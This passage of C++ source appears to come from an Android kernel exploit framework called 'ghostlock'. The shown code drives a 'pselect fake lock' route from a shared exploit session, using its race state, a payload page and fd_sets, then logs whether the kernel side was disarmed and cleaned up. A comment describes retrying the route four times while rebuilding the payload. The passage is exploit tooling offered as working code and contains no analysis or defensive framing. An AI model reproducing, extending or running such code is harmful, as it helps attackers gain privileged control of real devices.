        calls = calls_total;
        successes = successes_total;
        return status;
    }
} // namespace ghostlock::route::select_stack

namespace ghostlock::route {
    route::RouteStatus do_pselect_fake_lock_route(const memory::WriteRequest *request) {
        /* U01/SELECT-01: SelectStackRoute::execute() now retries compact routes
     * four times, rebuilding the payload page and fd_sets per attempt and
     * advancing the consumer handshake. The delay ladder and the attempt
     * count stay native-side until a Select device can validate a
     * profile-schema extension; the profile still owns the timeout. */
        select_stack::SelectStackRoute context(
            &session::g_exploit_session.race, request, session::g_exploit_session.profile,
            session::g_exploit_session.profile.select_stack_layout(),
            standard_io_backup);
        const route::RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 34) {
            pr_error("pselect consumer still inflight; leaking route fds\n");
        }

        pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n", context.calls, context.successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return status;
    }
} // namespace ghostlock::route
#endif // __ANDROID__


